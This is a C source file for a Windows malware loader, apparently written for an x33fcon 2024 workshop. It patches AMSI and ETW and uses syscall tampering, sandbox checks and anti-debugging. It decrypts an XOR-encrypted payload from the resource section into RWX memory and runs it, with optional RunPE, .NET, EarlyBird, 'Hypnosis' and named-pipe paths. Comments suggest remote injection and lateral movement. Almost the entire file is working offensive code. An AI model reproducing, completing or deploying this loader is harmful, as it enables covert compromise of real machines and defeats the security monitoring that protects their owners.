#include <windows.h>
#include "defines.h"

//#include "debug/debug_peb.h"

#ifdef VERBOSE
#define DBG(...) printf(__VA_ARGS__ "\n")
#else
#define DBG(...)
#endif

#define ZwAllocateVirtualMemory_CRCA     0x71D7EF35
#define ZwProtectVirtualMemory_CRCA      0x998153D9
#define ZwWriteVirtualMemory_CRC32       0xFAB864E6

#define ntdlldll_CRC32   0xF87B6F6B

#include "evasion/SyscallTampering.h"
#include "sandbox/domain.h"
#include "auxiliary/resource.h"
#include "auxiliary/helpers.h"
#include "evasion/patch_amsi_etw.h"

#ifdef RUN_PE
#include "execution/runpe.h"
#endif

#ifdef RUN_DOTNET
#include "execution/dotnet.h"
#endif

#ifdef EARLYBIRD
#include "execution/earlybird.h"
#endif

#ifdef HYPNOSIS
#include "execution/hypnosis.h"
#endif
/*
#ifdef SLEEP
#include "evasion/sleep.h"
#endif
*/
#ifdef PIPE
#include "evasion/pipe.h"
#endif


/**
 * XOR encrypts a payload with the given key and stores the result in "output".
 */

VOID 
XorCrypt(
    PCHAR payload, 
    PCHAR key,
    PCHAR output, 
    INT payloadLen
)
{
    INT keyLength = strlen(key);
    for (INT i = 0; i < payloadLen; ++i)
    {
        output[i] = payload[i] ^ key[i % keyLength];
    }
}

INT
Run()
{
    NTSTATUS ntStatus;
    HMODULE  hNtdll;
    //SIZE_T   payloadLen             = SHELLCODE_LEN;
#ifdef PIPE
    CHAR    payload[PIPESIZE] = SHELLCODE; //shellcode here is actually decryptprotect.bin
    SIZE_T  payloadLen = PIPESIZE;
#else
    SIZE_T   payloadLen             = SHELLCODE_LEN;
#endif

#ifdef SANDBOX_DOMAIN
    if (!IsDomainJoined()) 
    {
        return 0;
    }
#endif

#ifdef ANTI_DEBUG
    if (IsBeingDebugged_PEB())
    {
        return 0;
    }
#endif

#ifdef SLEEP
    __asm(".byte 0x31, 0xC0, 0x31, 0xD2, 0x31, 0xC9, 0x45, 0x31, 0xC0, 0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE, 0x7F, 0x49, 0xC7, 0xC0, 0x80, 0x96, 0x98, 0x00, 0x49, 0xF7, 0xF0, 0x31, 0xD2, 0x31, 0xC9, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE, 0x7F, 0x49, 0xF7, 0xF0, 0x48, 0x89, 0xC2, 0x48, 0x29, 0xCA, 0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x48, 0x39, 0xC2, 0x7C, 0xE1");
#endif

    // --------------------------------------------------------------------------------------
    // Resolve syscalls. See syscalls.h for more info.
    if (!InitHardwareBreakpointHooking())
		return -1;

#ifdef PATCH_ETW
    if (!PatchEtwpEventWriteFullStart())
    {
        return 1;
    }
    DBG("[*] patched ETW");
#endif

#ifdef PATCH_AMSI
    if (!PatchAmsiScanBufferJe(PATCH_AMSI_OPEN_SESSION))
    {
        return 2;
    }
    DBG("[*] patched AMSI");
#endif

    // --------------------------------------------------------------------------------------

    // Allocate memory for payload 
#ifndef PIPE
    ULONG  ulOld        = 0;
    LPVOID pAllocMem    = NULL;    
    SIZE_T allocSizeOut = payloadLen;

    TAMPER_SYSCALL(ZwAllocateVirtualMemory_CRCA, (HANDLE)-1, &pAllocMem, 0x00, &payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, NULL, NULL, NULL, NULL);
    DBG("[*] Allocated memory for payload");

    // Decrypt and copy to allocated memory

    //CHAR decryptedPayload[SHELLCODE_LEN] = { 0 };
    // Adding in code to pull from resource section
    
    DWORD psResourceDataSize = {0};
    PVOID ppResourceRawData = NULL;
    if (!GetResourceData(GetModuleHandle(NULL), BOBBY, &ppResourceRawData, &psResourceDataSize)) {
		DBG("[-] Couldn't retrieve resource section payload");
        return -1;
	}
    XorCrypt(ppResourceRawData, ENCRYPTION_KEY, pAllocMem, payloadLen);
    //RtlCopyMemory(pAllocMem, decryptedPayload, payloadLen);
    
    DBG("[*] Decrypted payload");
#else
    //CHAR decryptedPayload[PIPESIZE] = { 0 };
    //XorCrypt(payload, ENCRYPTION_KEY, decryptedPayload, payloadLen);
    //RtlCopyMemory(pAllocMem, payload, payloadLen);

    //DWORD psPipeDataSize = {0};
    //PVOID ppPipeRawData = NULL;
    //if (!GetResourceData(GetModuleHandle(NULL), 7, &ppPipeRawData, &psPipeDataSize)) {
	//	DBG("[-] Couldn't retrieve resource section payload");
    //    return -1;
	//}
    //DBG("[*] Got handle to data");
    //XorCrypt(ppPipeRawData, ENCRYPTION_KEY, pAllocMem, payloadLen);
    //RtlCopyMemory(pAllocMem, ppPipeRawData, psPipeDataSize);
    DBG("[*] Wrote Decrypted payload");
#endif // end the PIPE ifelse

//#endif // HYPNOSIS END
    
    // --------------------------------------------------------------------------------------

#ifdef INJECT_SHELLCODE
    // Make shellcode page executable
    DWORD dwOld;
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &pAllocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)

    if (!NT_SUCCESS(ntStatus))
    {
        exit(GetLastError());
    }

    DBG("[*] Protected payload: RWX");

    // Run via direct pointer
    ((VOID(*)())pAllocMem)();

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Add other shellcode execution methods. Process Mockingjay? Remote injection? PoolParty? //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
#endif

#ifdef RUN_PE
    RunPortableExecutable(pAllocMem, hNtdll);
#endif

#ifdef RUN_DOTNET
    RunDotnetAssembly(pAllocMem, SHELLCODE_LEN);
#endif

#ifdef EARLYBIRD
    #ifndef PIPE
    EarlyBird(TARGET_PROCESS, pAllocMem, SHELLCODE_LEN);
    #else
    EarlyBird(TARGET_PROCESS, payload, payloadLen);
    #endif
#endif

#ifdef HYPNOSIS
    #ifndef PIPE
    Hypnosis(pAllocMem, SHELLCODE_LEN);
    #else
    Hypnosis(payload, payloadLen);
    #endif
#endif

#ifdef PIPE
    __asm(".byte 0x31, 0xC0, 0x31, 0xD2, 0x31, 0xC9, 0x45, 0x31, 0xC0, 0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE, 0x7F, 0x49, 0xC7, 0xC0, 0x80, 0x96, 0x98, 0x00, 0x49, 0xF7, 0xF0, 0x31, 0xD2, 0x31, 0xC9, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE, 0x7F, 0x49, 0xF7, 0xF0, 0x48, 0x89, 0xC2, 0x48, 0x29, 0xCA, 0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x48, 0x39, 0xC2, 0x7C, 0xE1");
    DWORD psResourceDataSize = {0};
    PVOID ppResourceRawData = NULL;
    if (!GetResourceData(GetModuleHandle(NULL), BOBBY, &ppResourceRawData, &psResourceDataSize)) {
		DBG("[-] Couldn't retrieve resource section payload");
        return -1;
	}
    DBG("[+] Sending data to named pipe!");
    CreateNamedPipeClientW(L"\\\\.\\pipe\\MyPipe",ppResourceRawData, psResourceDataSize);
#endif

    // --------------------------------------------------------------------------------------
    // Cleanup

    if (!HaltHardwareBreakpointHooking())
		return -1;
    return 0; 
}

#ifndef AS_DLL
/**
 * Entry if compiled as EXE
 */
INT 
main()
{
    DBG("[*] Hello from malware made at x33fcon '24 :3");
    return Run();
}
#endif

#ifdef AS_DLL
/**
 * Entry if compiled as DLL
 */
BOOL 
APIENTRY 
DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved 
)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            Run();
            break;
        case DLL_THREAD_ATTACH:  // A process is creating a new thread.
        case DLL_THREAD_DETACH:  // A thread exits normally.
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
#endif

// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
// TODO FOR YOU: Besides DLL and EXE, maybe a service-executable can be useful for lateral movement //
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
